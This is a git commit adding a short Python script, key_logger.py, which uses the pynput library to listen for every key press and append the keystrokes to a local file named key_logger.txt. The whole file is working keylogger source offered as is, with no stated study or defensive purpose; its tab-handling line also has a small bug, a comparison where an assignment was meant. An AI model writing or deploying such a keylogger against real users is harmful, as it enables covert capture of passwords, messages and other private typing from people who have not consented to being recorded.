1a76164514ab0c927e71de5f02578859432d2ef6
abraraltaf92 <74110158+abraraltaf92@users.noreply.github.com>
2020-12-04 01:07:46 +0530

    Add files via upload
    first time upload

---
+++ key_logger.py
@@ -0,0 +1,18 @@
+from pynput.keyboard import Listener
+def keypress(key):
+    key = str(key).replace("'","")
+
+    if key == 'Key.space':
+        key = " "
+    if key == 'Key.enter':
+        key = "\n"
+    if key =='Key.shift_r' or key == 'Key.shift':
+        key = "SHIFT"
+    if key =='Key.tab':
+        key == "\t"
+    with open("key_logger.txt",'a') as f:
+        f.write(key)
+
+with Listener(on_press =keypress)as l:
+    l.join()
+
